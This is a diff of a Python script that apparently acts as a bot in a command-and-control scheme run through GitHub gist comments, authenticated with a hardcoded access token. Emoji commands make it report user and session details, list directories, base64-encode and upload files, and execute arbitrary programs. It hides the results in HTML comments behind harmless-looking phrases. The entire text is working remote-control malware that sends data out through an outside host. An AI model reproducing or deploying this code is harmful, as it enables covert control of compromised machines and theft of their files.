@@ -5,9 +5,9 @@ import time
 import json
 import subprocess
 
-ACCESS_TOKEN = "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"
+ACCESS_TOKEN = "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"
 URL = "https://api.github.com/gists/d3639f5c1e928cf7b6570929a075eb4c/comments"
-timestamp = datetime.now()
+timestamp = datetime.utcnow()
 
 # 👋 --> heartbeat from controller
 # 👀 --> heartbeat back
@@ -42,15 +42,19 @@ print("my id: " + str(commentId))
 greetings = ["Hello", "Hi"]
 idx = 0
 while True:
-    x = rq.get(URL)
+    x = rq.get(URL, headers={"Authorization": "Bearer "+ACCESS_TOKEN})
+    print(timestamp)
     if x.status_code == 200:
         x = x.json()
+        print("----------------------------------------------------")
         for comment in x:
             body = comment["body"]
             #from GMT0 to GMT+1
-            dt = datetime.strptime(comment["updated_at"], '%Y-%m-%dT%H:%M:%SZ') + timedelta(hours=1)
+            dt = datetime.strptime(comment["updated_at"], '%Y-%m-%dT%H:%M:%SZ')
+            #print(timestamp)
+            #print(comment["updated_at"] + " | " + body)
             if timestamp < dt: #new comment
-                print(body)
+                print("new comment: " + str(comment["id"]) + " | " + comment["updated_at"] + " | " + body)
                 if "👋" in body:
                     print("heartbeat")
                     data = {
@@ -64,35 +68,36 @@ while True:
                         idx = 1
                 elif "🥳" in body: #w
                     print("w")
-                    res = subprocess.run(["w"], stdout=subprocess.PIPE)
+                    res = subprocess.run(["w"], stdout=subprocess.PIPE).stdout.decode("utf-8")
                     post({"body": "I found one. <!-- " + NAME + ":\n" + res + " -->"})
                 elif "🫵" in body: #id
                     print("id")
-                    res = subprocess.run(["id"], stdout=subprocess.PIPE)
+                    res = subprocess.run(["id"], stdout=subprocess.PIPE).stdout.decode("utf-8")
                     post({"body": "The ability to speak does not make you intelligent. <!-- " + NAME + ":\n" + res + " -->"})
                 elif "🤓" in body: #ls
                     print("ls")
                     start = body.find("<!--")+5
                     end = body.find("-->")-1
                     path = body[start:end]
-                    res = subprocess.run(["ls", path], stdout=subprocess.PIPE)
+                    res = subprocess.run(["ls", path], stdout=subprocess.PIPE).stdout.decode("utf-8")
                     post({"body": "Polo! <!-- " + NAME + ":\n" + "ls " + path + "\n" + res + " -->"})
                 elif "🤯" in body: #copy
                     print("copy")
                     start = body.find("<!--")+5
                     end = body.find("-->")-1
                     path = body[start:end]
-                    res = subprocess.run(["base64", path], stdout=subprocess.PIPE)
+                    res = subprocess.run(["base64", path], stdout=subprocess.PIPE).stdout.decode("utf-8")
                     post({"body": "As you wish. <!-- " + path + "\n" + res + " -->"})
                 elif "😵‍💫" in body:
                     print("exec")
                     start = body.find("<!--")+5
                     end = body.find("-->")-1
                     path = body[start:end]
-                    res = subprocess.run([path], stdout=subprocess.PIPE)
+                    res = subprocess.run([path], stdout=subprocess.PIPE).stdout.decode("utf-8")
                     post({"body": "Kill it if you have to. <!-- " + path + "\n" + res + " -->"})
     else:
         print(x.json())
-
-    timestamp = datetime.now()
-    time.sleep(random.randint(1, 5))
+    timestamp = datetime.utcnow()
+    #print("sleeping...")
+    time.sleep(10)
+    #time.sleep(random.randint(30, 60))
